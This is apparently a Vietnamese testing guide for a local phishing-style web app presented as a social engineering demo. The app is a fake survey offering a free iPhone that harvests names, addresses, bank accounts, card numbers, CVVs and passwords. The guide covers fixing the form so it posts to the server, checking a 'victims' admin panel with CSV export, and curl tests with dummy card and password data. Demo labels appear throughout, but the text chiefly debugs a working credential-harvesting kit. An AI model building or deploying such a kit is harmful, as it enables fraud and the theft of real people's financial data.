# 🧪 TEST FORM - Hướng Dẫn Kiểm Tra

## ✅ ĐÃ SỬA LỖI

**Vấn đề:** Form submit nhưng không lưu dữ liệu vào JSON  
**Nguyên nhân:** Script chỉ log ra console, không gửi đến server  
**Giải pháp:** Đã thêm `fetch()` để gửi dữ liệu đến `/api/submit`

---

## 🚀 CÁCH TEST

### Bước 1: Chạy Server

```bash
python web.py
# Chọn 1 (HTTP)
```

### Bước 2: Mở Trang Web

```
http://localhost:5000
```

### Bước 3: Điền Form

Điền thông tin vào form (ít nhất các trường bắt buộc):
- ✅ Họ và tên đầy đủ *
- ✅ Số điện thoại *
- ✅ Email *
- ✅ Địa chỉ nhà *

### Bước 4: Submit

1. Nhấn nút "Hoàn thành khảo sát - Nhận iPhone"
2. Đợi 3 giây (có animation processing)
3. Xem trang success

### Bước 5: Kiểm Tra Dữ Liệu

#### Cách 1: Admin Panel
```
http://localhost:5000/admin
```
- Xem dashboard statistics
- Xem bảng dữ liệu
- Tìm kiếm
- Export CSV

#### Cách 2: File JSON
```
Mở file: social_engineering_data.json
```

#### Cách 3: Console Log
- Mở DevTools (F12)
- Tab Console
- Xem message: "✅ Dữ liệu đã được lưu vào JSON file"

#### Cách 4: Terminal/Server Log
Xem trong terminal chạy server:
```
🚨 CẢNH BÁO DEMO: Dữ liệu đã được thu thập và LƯU VÀO JSON FILE
ID: 1
Email: test@example.com
...
```

---

## 📊 KIỂM TRA KẾT QUẢ

### ✅ Thành Công Khi:

1. **Console log hiển thị:**
   ```
   ✅ Dữ liệu đã được lưu vào JSON file: {status: "success", ...}
   ```

2. **File JSON có dữ liệu:**
   ```json
   {
     "metadata": {
       "total_submissions": 1,
       ...
     },
     "submissions": [
       {
         "id": 1,
         "full_name": "Test User",
         "email": "test@example.com",
         ...
       }
     ]
   }
   ```

3. **Admin panel hiển thị:**
   - Tổng số nạn nhân: 1
   - Bảng có 1 dòng dữ liệu

4. **Server log hiển thị:**
   ```
   🚨 CẢNH BÁO DEMO: Dữ liệu đã được thu thập...
   ID: 1
   ...
   ```

---

## ❌ NẾU VẪN LỖI

### Lỗi 1: "Network Error" hoặc "Failed to fetch"

**Nguyên nhân:** Server không chạy

**Giải pháp:**
```bash
# Kiểm tra server đang chạy
# Terminal phải hiển thị:
# 🚀 Đang khởi động server với HTTP...
# 🌐 http://localhost:5000
```

### Lỗi 2: "404 Not Found"

**Nguyên nhân:** API endpoint không đúng

**Giải pháp:**
```bash
# Kiểm tra web.py có route:
# @app.route('/api/submit', methods=['POST'])
```

### Lỗi 3: File JSON không tạo

**Nguyên nhân:** Server không có quyền ghi file

**Giải pháp:**
```bash
# Check quyền folder
# Hoặc chạy với admin/sudo
```

### Lỗi 4: Admin panel trống

**Nguyên nhân:** Chưa refresh hoặc API lỗi

**Giải pháp:**
```bash
# 1. Nhấn F5 refresh trang admin
# 2. Check console (F12) xem lỗi
# 3. Test API trực tiếp:
curl http://localhost:5000/api/submissions
```

---

## 🧪 TEST NHANH với cURL

### Test 1: Submit dữ liệu

```bash
curl -X POST http://localhost:5000/api/submit \
  -H "Content-Type: application/json" \
  -d '{
    "fullName": "Test User",
    "phone": "0123456789",
    "email": "test@example.com",
    "address": "123 Test Street",
    "bankAccount": "1234567890",
    "cardNumber": "1234 5678 9012 3456",
    "cvv": "123",
    "password": "test123",
    "income": "10-20m"
  }'
```

**Kết quả mong đợi:**
```json
{
  "status": "success",
  "message": "Dữ liệu đã được lưu vào JSON file (demo)",
  "id": 1
}
```

### Test 2: Lấy dữ liệu

```bash
curl http://localhost:5000/api/submissions
```

**Kết quả mong đợi:**
```json
{
  "status": "success",
  "total": 1,
  "submissions": [...]
}
```

---

## ✨ ĐÃ SỬA GÌ?

### File: `script.js`

**TRƯỚC (Chỉ log console):**
```javascript
function collectFakeData() {
    // ... collect data
    console.log('🚨 FAKE DATA COLLECTION:', collectedData);
    // KHÔNG GỬI ĐẾN SERVER
}
```

**SAU (Gửi đến server):**
```javascript
async function collectFakeData() {
    // ... collect data
    console.log('🚨 FAKE DATA COLLECTION:', collectedData);
    
    // GỬI ĐẾN SERVER ✅
    const response = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(collectedData)
    });
    
    const result = await response.json();
    console.log('✅ Đã lưu:', result);
}
```

---

## 🎯 CHECKLIST

Để đảm bảo hoạt động đúng:

- [ ] Server đang chạy (`python web.py`)
- [ ] Trang web load được (http://localhost:5000)
- [ ] Điền form đầy đủ (ít nhất các trường *)
- [ ] Click submit
- [ ] Đợi 3 giây
- [ ] Check console (F12) → có message "✅ Đã lưu"
- [ ] Mở admin panel → có dữ liệu
- [ ] Mở file JSON → có dữ liệu
- [ ] Server log → có message "🚨 CẢNH BÁO DEMO"

---

## 📝 DỮ LIỆU MẪU ĐỂ TEST

```
Họ tên: Nguyễn Văn Test
SĐT: 0901234567
Email: test@example.com
Địa chỉ: 123 ABC Street, Quận 1, TP.HCM
TK Ngân hàng: 1234567890
Số thẻ: 1234 5678 9012 3456
CVV: 123
Mật khẩu: test123
Thu nhập: 10-20m
```

---

**GIỜ CHẠY LẠI VÀ TEST NHÉ! 🚀**

```bash
python web.py
# → http://localhost:5000
# → Điền form → Submit
# → Xem admin: http://localhost:5000/admin
```

**PHẢI THẤY DỮ LIỆU RỒI! ✅**

